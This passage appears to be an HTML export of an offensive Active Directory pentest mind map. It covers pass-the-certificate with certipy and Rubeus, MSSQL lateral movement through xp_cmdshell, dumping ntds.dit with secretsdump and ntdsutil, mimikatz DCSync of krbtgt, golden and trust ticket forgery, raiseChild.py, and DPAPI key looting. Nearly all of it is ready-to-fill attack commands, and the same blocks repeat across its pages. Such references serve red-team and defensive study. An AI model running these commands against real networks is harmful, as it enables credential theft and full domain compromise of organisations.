/user:&quot;&lt;username&gt;&quot; /certificate:&quot;&lt;pfx_file&gt;&quot; [/password:&quot;&lt;certificate_password&gt;&quot;] /domain:&quot;&lt;fqdn-domain&gt;&quot; /dc:&quot;&lt;dc&gt;&quot; /show`</p><p>    - `certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;`</p><p>  - schannel</p><p>    - `certipy auth -pfx &lt;pfx_file&gt; -ldap-shell`<ul><li>add_computer</li></ul></p><p>        - Set RBCD &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p>    - `certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nokey -out &quot;user.crt&quot;`<ul><li>`certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nocert -out &quot;user.key&quot;`</li></ul></p><p>        - `passthecert.py -action ldap-shell -crt &lt;user.crt&gt; -key &lt;user.key&gt; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--pkinit_1252.html"></a><h1 class='title level-5'>pkinit</h1><br/><p># Lateral Move</p><p>## Certificate (pfx)</p><p>### Pass the certificate</p><p>#### pkinit</p><p></p><p>gettgtpkinit.py -cert-pfx &quot;&lt;pfx_file&gt;&quot; ^[-pfx-pass  &quot;&lt;cert-password&gt;&quot;] &quot;&lt;fqdn_domain&gt;/&lt;user&gt;&quot; &quot;&lt;tgt_ccache_file&gt;&quot;</p><p></p><p>Rubeus.exe asktgt /user:&quot;&lt;username&gt;&quot; /certificate:&quot;&lt;pfx_file&gt;&quot; [/password:&quot;&lt;certificate_password&gt;&quot;] /domain:&quot;&lt;fqdn-domain&gt;&quot; /dc:&quot;&lt;dc&gt;&quot; /show</p><p></p><p>certipy auth -pfx &lt;crt_file&gt; -dc-ip &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--schannel_1253.html"></a><h1 class='title level-5'>schannel</h1><br/><p># Lateral Move</p><p>## Certificate (pfx)</p><p>### Pass the certificate</p><p>#### schannel</p><p></p><p>certipy auth -pfx &lt;pfx_file&gt; -ldap-shell</p><p>&gt;&gt;	add_computer</p><p>	&gt;&gt;	Set RBCD &gt;&gt;&gt; RBCD [<a href="#Domain_Dominance--Kerberos_Delegation--Resource-Based_Constrained_Delegation_1058.html">Resource-Based Constrained Delegation</a>]</p><p></p><p>certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nokey -out &quot;user.crt&quot;</p><p>&gt;&gt;	certipy cert -pfx &quot;&lt;pfx_file&gt;&quot; -nocert -out &quot;user.key&quot;</p><p>	&gt;&gt;	passthecert.py -action ldap-shell -crt &lt;user.crt&gt; -key &lt;user.key&gt; -domain &lt;domain&gt; -dc-ip &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--MSSQL_1092.html"></a><h1 class='title level-3'>MSSQL</h1><br/><p># Lateral Move</p><p>## MSSQL</p><p><ul><li>Users or Computers with SQL admin</p><p></li></ul></p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--MSSQL--Find_mssql_access_1254.html"></a><h1 class='title level-4'>Find mssql access</h1><br/><p># Lateral Move</p><p>## MSSQL</p><p>### Find mssql access</p><p></p><p>nxc mssql &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p></div><div class='page'><a name="Domain_Dominance--Lateral_Movement--MSSQL--mssqlclient.py_1255.html"></a><h1 class='title level-4'>mssqlclient.py</h1><br/><p># Lateral Move</p><p>## MSSQL</p><p>### mssqlclient.py</p><p></p><p>mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</p><p>&gt;&gt;	enum_db</p><p>&gt;&gt;	enable_xp_cmdshell</p><p>	&gt;&gt;	xp_cmdshell &lt;cmd&gt; &gt;&gt;&gt; Low Access [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p>&gt;&gt;	enum_impersonate</p><p>	&gt;&gt;	exec_as_user &lt;user&gt; &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p>	&gt;&gt;	exec_as_login &lt;login&gt; &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p>&gt;&gt;	xp_dir_tree &lt;ip&gt; &gt;&gt;&gt; COERCE SMB [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p>&gt;&gt;	trustlink</p><p>	&gt;&gt;	sp_linkedservers</p><p>	&gt;&gt;	use_link` &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>] || Trust [<a href="#Domain_Dominance--Trusts_981.html">Trusts</a>]</p></div><div class='page'><a name="Domain_Dominance--Domain_Admin_980.html"></a><h1 class='title level-2'>Domain Admin</h1><br/><p><ul><li><code>nxc smb --ntds</code>, <code>secretsdump.py</code>, <code>ntdsutil</code></li></ul></p><p> • <strong>Intent:</strong> Dump ntds.dit / AD database.</p><p> • <strong>Purpose:</strong> Extract all domain creds.</p><p><ul><li><code>mimikatz lsadump::dcsync</code>, <code>certsync</code></li></ul></p><p> • <strong>Intent:</strong> Replicate AD secrets or abuse ADCS.</p><p> • <strong>Purpose:</strong> Gain krbtgt/hash → persist DA.</p><p><ul><li><code>donpapi collect --fetch-pvk</code></li></ul></p><p> • <strong>Intent:</strong> Loot private keys via DPAPI.</p><p> • <strong>Purpose:</strong> Recover certs to escalate.</p><p></p></div><div class='page'><a name="Domain_Dominance--Domain_Admin--Dump_ntds.dit_1093.html"></a><h1 class='title level-3'>Dump ntds.dit</h1><br/><p># Domain admin</p><p>## Dump ntds.dit &gt;&gt;&gt; Lateral move [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>] || Crack hash [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>nxc smb &lt;dcip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</p><p></p><p>secretsdump.py &#39;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#39;@&lt;ip&gt;</p><p></p><p>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</p><p>&gt;&gt;	secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</p><p></p><p>msf&gt; windows/gather/credentials/domain_hashdump</p><p></p><p>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;target_domain&gt;\administrator</p><p></p><p>certsync -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -ns &lt;name_server&gt;</p></div><div class='page'><a name="Domain_Dominance--Domain_Admin--Grab_backup_Keys_1094.html"></a><h1 class='title level-3'>Grab backup Keys</h1><br/><p># Domain admin</p><p>## Grab backup Keys &gt;&gt;&gt; Credentials [<a href="#Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)_971.html">Valid Credentials (cleartext, NT hash, Kerberos ticket)</a>]</p><p></p><p>donpapi collect - H &#39;:&lt;hash&gt;&#39; &lt;domain&gt;/&lt;user&gt;@&lt;ip_range&gt; -t ALL --fetch-pvk</p></div><div class='page'><a name="Domain_Dominance--Trusts_981.html"></a><h1 class='title level-2'>Trusts</h1><br/><p><ul><li>Enumeration (<code>nltest</code>, <code>Get-DomainTrust</code>, BloodHound)</li></ul></p><p> • <strong>Intent:</strong> Enumerate trust relationships.</p><p> • <strong>Purpose:</strong> Find cross-domain pivots.</p><p><ul><li>Child→Parent (Trust Key, Golden Ticket)</li></ul></p><p> • <strong>Intent:</strong> Abuse trust keys or krbtgt.</p><p> • <strong>Purpose:</strong> Issue forged tickets for escalation.</p><p><ul><li>Unconstrained delegation child→parent</li></ul></p><p> • <strong>Intent:</strong> Force parent DC to auth to child.</p><p> • <strong>Purpose:</strong> Pivot upward.</p><p><ul><li>Parent→Child</li></ul></p><p> • <strong>Intent:</strong> Same methods reversed.</p><p> • <strong>Purpose:</strong> Lateral across forest.</p><p><ul><li>External trusts (A↔B, A trusts B, etc.)</li></ul></p><p> • <strong>Intent:</strong> Abuse password reuse, foreign groups, SID history.</p><p> • <strong>Purpose:</strong> Pivot into external domain.</p><p><ul><li>ADCS abuse in trusts</li></ul></p><p> • <strong>Intent:</strong> Use PKI misconfigs across domains.</p><p> • <strong>Purpose:</strong> Escalate across trust boundary.</p><p><ul><li>MSSQL links (<code>Get-SQLServerLinkCrawl</code>, <code>mssqlclient</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse SQL linked servers across trusts.</p><p> • <strong>Purpose:</strong> Lateral pivot through DB.</p><p></p></div><div class='page'><a name="Domain_Dominance--Trusts--Enumeration_1095.html"></a><h1 class='title level-3'>Enumeration</h1><br/><p># Trusts</p><p>## Enumeration</p><p></p><p>nltest.exe /trusted_domains</p><p></p><p>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</p><p></p><p>Get-DomainTrust -Domain &lt;domain&gt;</p><p></p><p>Get-DomainTrustMapping</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; trusts</p><p></p><p>sharphound.exe -c trusts -d &lt;domain&gt;</p><p>&gt;&gt;	MATCH p=(:Domain)-[:TrustedBy]-&gt;(:Domain) RETURN p</p><p></p></div><div class='page'><a name="Domain_Dominance--Trusts--Enumeration--Get_Domains_SID_1256.html"></a><h1 class='title level-4'>Get Domains SID</h1><br/><p># Trusts</p><p>## Enumeration</p><p>### Get Domains SID</p><p></p><p>Get-DomainSID -Domain &lt;domain&gt; Get-DomainSID -Domain &lt;target_domain&gt;</p><p></p><p>lookupsid.py -domain-sids &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;@&lt;dc&gt; 0 lookupsid.py -domain-sids &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&#39;@&lt;target_dc&gt; 0</p></div><div class='page'><a name="Domain_Dominance--Trusts--Child-Parent_1096.html"></a><h1 class='title level-3'>Child->Parent</h1><br/><p># Trusts</p><p>## Child-&gt;Parent<ul><li>Trust Key &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</li></ul></p><p>  - `mimikatz lsadump::trust /patch`</p><p>    - `mimikatz kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;trust_key_aes256&gt; /sids:&lt;target_domain_sid&gt;-519 /service:krbtgt /target:&lt;target_domain&gt; /ptt`</p><p>  - `secretsdump.py -just-dc-user &#39;&lt;parent_domain&gt;$&#39;   &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc_ip&gt;`</p><p>    - `ticketer.py -nthash &lt;trust_key&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 -spn krbtgt/&lt;parent_domain&gt; trustfakeuser`</p><p><ul><li>Golden Ticket &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</li></ul></p><p>  - `mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt`</p><p>    - `mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt`</p><p>  - `raiseChild.py &lt;child_domain&gt;/&lt;user&gt;:&lt;password&gt;`</p><p>  - `ticketer.py -nthash &lt;child_krbtgt_hash&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 goldenuser`</p><p><ul><li>Unconstrained delegation</li></ul></p><p>  - coerce parent_dc on child_dc domain &gt;&gt;&gt; unconstrained delegation [<a href="#Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html">Unconstrained delegation</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Trusts--Child-Parent--Trust_Key_1257.html"></a><h1 class='title level-4'>Trust Key</h1><br/><p># Trusts</p><p>## Child-&gt;Parent</p><p>### Trust Key &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p></p><p>mimikatz lsadump::trust /patch</p><p>&gt;&gt;	mimikatz kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;trust_key_aes256&gt; /sids:&lt;target_domain_sid&gt;-519 /service:krbtgt /target:&lt;target_domain&gt; /ptt</p><p></p><p>secretsdump.py -just-dc-user &#39;&lt;parent_domain&gt;$&#39;   &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;dc_ip&gt;</p><p>&gt;&gt;	ticketer.py -nthash &lt;trust_key&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 -spn krbtgt/&lt;parent_domain&gt; trustfakeuser</p></div><div class='page'><a name="Domain_Dominance--Trusts--Child-Parent--Golden_Ticket_1258.html"></a><h1 class='title level-4'>Golden Ticket</h1><br/><p># Trusts</p><p>## Child-&gt;Parent</p><p>### Golden Ticket &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p></p><p>mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt</p><p>&gt;&gt;	mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt</p><p></p><p>raiseChild.py &lt;child_domain&gt;/&lt;user&gt;:&lt;password&gt;</p><p></p><p>ticketer.py -nthash &lt;child_krbtgt_hash&gt; -domain-sid &lt;child_sid&gt; -domain &lt;child_domain&gt; -extra-sid &lt;parent_sid&gt;-519 goldenuser</p></div><div class='page'><a name="Domain_Dominance--Trusts--Child-Parent--Unconstrained_delegation_1259.html"></a><h1 class='title level-4'>Unconstrained delegation</h1><br/><p># Trusts</p><p>## Child-&gt;Parent</p><p>### Unconstrained delegation</p><p></p><p>coerce parent_dc on child_dc domain &gt;&gt;&gt; Unconstrained delegation [<a href="#Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html">Unconstrained delegation</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Trusts--Parent-Child_1097.html"></a><h1 class='title level-3'>Parent->Child</h1><br/><p># Trusts</p><p>## Parent-&gt;Child</p><p></p><p>Same as Child to parent [<a href="#Domain_Dominance--Trusts--Child-Parent_1096.html">Child-&gt;Parent</a>]</p><p></p></div><div class='page'><a name="Domain_Dominance--Trusts--External_Trust_1098.html"></a><h1 class='title level-3'>External Trust</h1><br/><p># Trusts</p><p>## External Trust </p><p><ul><li>DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</li></ul></p><p>  - from A to B FOREST_TRANSITIVE</p><p>    - password reuse &gt;&gt;&gt; lat move (creds/pth/...) [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p>    - Foreign group and users &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>]<ul><li>Users with foreign Domain Group Membership</li></ul></p><p>        - `MATCH p=(n:User {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p`<ul><li>Group with foreign Domain Group Membership</li></ul></p><p>        - `MATCH p=(n:Group {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p`</p><p>    - SID History on B &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]<ul><li>Golden ticket</li></ul></p><p>        - `mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt`</p><p>          - `mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt`</p><p>        - `ticketer.py -nthash &lt;krbtgt&gt; -domain-sid &lt;domain_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; fakeuser`<ul><li>Trust ticket</li></ul></p><p>        - `secretsdump.py -just-dc-user &#39;&lt;domainB&gt;&#39; &lt;domainA&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;dc_a&gt;`</p><p>          - `ticketer.py -nthash &lt;trust_hash&gt; -domain-sid &lt;sid_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; -spn krbtgt/&lt;domain_a&gt; fakeuser`</p><p>    - ADCS abuse &gt;&gt;&gt; ADCS [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>]</p><p>  - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL<ul><li>Unconstrained delegation</li></ul></p><p>        - coerce dc_b on dc_a &gt;&gt;&gt; unconstrained delegation [<a href="#Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html">Unconstrained delegation</a>]</p><p>        <ul><li>DomainA &lt;-- DomainB trust (B trust A / A access B)</li></ul></p><p>  - Same as double trust, but no unconstrained delegation as B can&#39;t connect to A [<a href="#Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)_1260.html">DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</a></p><p><ul><li>DomainA --&gt; DomainB trust (A trust B / B access A)</li></ul></p><p>  - password reuse &gt;&gt;&gt; lat move (creds/pth/...) [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)_1260.html"></a><h1 class='title level-4'>DomainA <--> DomainB trust (B trust A, A trust B)</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>  - from A to B FOREST_TRANSITIVE</p><p>    - password reuse &gt;&gt;&gt; lat move (creds/pth/...) [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p>    - Foreign group and users &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>]<ul><li>Users with foreign Domain Group Membership</li></ul></p><p>        - `MATCH p=(n:User {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p`<ul><li>Group with foreign Domain Group Membership</li></ul></p><p>        - `MATCH p=(n:Group {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p`</p><p>    - SID History on B &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]<ul><li>Golden ticket</li></ul></p><p>        - `mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt`</p><p>          - `mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt`</p><p>        - `ticketer.py -nthash &lt;krbtgt&gt; -domain-sid &lt;domain_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; fakeuser`<ul><li>Trust ticket</li></ul></p><p>        - `secretsdump.py -just-dc-user &#39;&lt;domainB&gt;&#39; &lt;domainA&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;dc_a&gt;`</p><p>          - `ticketer.py -nthash &lt;trust_hash&gt; -domain-sid &lt;sid_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; -spn krbtgt/&lt;domain_a&gt; fakeuser`</p><p>    - ADCS abuse &gt;&gt;&gt; ADCS [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>]</p><p>  - from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL<ul><li>Unconstrained delegation</li></ul></p><p>        - coerce dc_b on dc_a &gt;&gt;&gt; unconstrained delegation [<a href="#Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html">Unconstrained delegation</a>]</p></div><div class='page'><a name="Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_FOREST_TRANSITIVE_1263.html"></a><h1 class='title level-5'>From A to B FOREST_TRANSITIVE</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B FOREST_TRANSITIVE</p><p></p><p>Password reuse &gt;&gt;&gt; lat move (creds/pth/...) [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p><p></p><p>ADCS abuse &gt;&gt;&gt; ADCS [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>]</p></div><div class='page'><a name="nce--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_FOREST_TRANSITIVE--Foreign_group_and_users_1265.html"></a><h1 class='title level-6'>Foreign group and users</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B FOREST_TRANSITIVE</p><p>##### Foreign group and users &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>]</p><p></p><p>Users with foreign Domain Group Membership</p><p>&gt;&gt;	MATCH p=(n:User {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p</p><p></p><p>Group with foreign Domain Group Membership</p><p>&gt;&gt;	MATCH p=(n:Group {domain:&quot;&lt;DOMAIN.FQDN&gt;&quot;})-[:MemberOf]-&gt;(m:Group) WHERE m.domain&lt;&gt;n.domain RETURN p</p></div><div class='page'><a name="_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_FOREST_TRANSITIVE--SID_History_on_B_1266.html"></a><h1 class='title level-6'>SID History on B</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B FOREST_TRANSITIVE</p><p>##### SID History on B &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]<ul><li>Golden ticket</li></ul></p><p>        - `mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt`</p><p>          - `mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt`</p><p>        - `ticketer.py -nthash &lt;krbtgt&gt; -domain-sid &lt;domain_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; fakeuser`<ul><li>Trust ticket</li></ul></p><p>        - `secretsdump.py -just-dc-user &#39;&lt;domainB&gt;&#39; &lt;domainA&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;dc_a&gt;`</p><p>          - `ticketer.py -nthash &lt;trust_hash&gt; -domain-sid &lt;sid_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; -spn krbtgt/&lt;domain_a&gt; fakeuser`</p></div><div class='page'><a name="sts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_FOREST_TRANSITIVE--SID_History_on_B--Golden_Ticket_1267.html"></a><h1 class='title level-7'>Golden Ticket</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B FOREST_TRANSITIVE</p><p>##### SID History on B &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p>###### Golden ticket</p><p></p><p>mimikatz lsadump::dcsync /domain:&lt;domain&gt; /user:&lt;domain&gt;\krbtgt</p><p>&gt;&gt;	mimikatz kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID&gt;-&lt;GROUP_SID_SUP_1000&gt; /ptt</p><p></p><p>ticketer.py -nthash &lt;krbtgt&gt; -domain-sid &lt;domain_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; fakeuser</p></div><div class='page'><a name="usts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_FOREST_TRANSITIVE--SID_History_on_B--Trust_Ticket_1268.html"></a><h1 class='title level-7'>Trust Ticket</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B FOREST_TRANSITIVE</p><p>##### SID History on B &gt;&gt;&gt; PassTheTicket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>]</p><p>###### Trust ticket</p><p></p><p>secretsdump.py -just-dc-user &#39;&lt;domainB&gt;&#39; &lt;domainA&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;dc_a&gt;</p><p>&gt;&gt;	ticketer.py -nthash &lt;trust_hash&gt; -domain-sid &lt;sid_a&gt; -domain &lt;domain_a&gt; -extra-sid &lt;domain_b_sid&gt;-&lt;group_sid sup 1000&gt; -spn krbtgt/&lt;domain_a&gt; fakeuser</p></div><div class='page'><a name="ominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)--From_A_to_B_is_FOREST_TRANSITIVETREAT_AS_EXTERNAL_1264.html"></a><h1 class='title level-5'>From A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</p><p>#### From A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL</p><p></p><p>Unconstrained delegation</p><p>&gt;&gt;	coerce dc_b on dc_a &gt;&gt;&gt; unconstrained delegation [<a href="#Domain_Dominance--Kerberos_Delegation--Unconstrained_delegation_1056.html">Unconstrained delegation</a>]</p></div><div class='page'><a name="Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A_-_A_access_B)_1261.html"></a><h1 class='title level-4'>DomainA <-- DomainB trust (B trust A / A access B)</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA &lt;-- DomainB trust (B trust A / A access B)</p><p></p><p>Same as double trust, but no unconstrained delegation as B can&#39;t connect to A [<a href="#Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(B_trust_A,_A_trust_B)_1260.html">DomainA &lt;--&gt; DomainB trust (B trust A, A trust B)</a></p></div><div class='page'><a name="Domain_Dominance--Trusts--External_Trust--DomainA_--_DomainB_trust_(A_trust_B_-_B_access_A)_1262.html"></a><h1 class='title level-4'>DomainA --> DomainB trust (A trust B / B access A)</h1><br/><p># Trusts</p><p>## External Trust </p><p>### DomainA --&gt; DomainB trust (A trust B / B access A)</p><p></p><p>Password reuse &gt;&gt;&gt; lat move (creds/pth/...) [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--Trusts--Mssql_links_1099.html"></a><h1 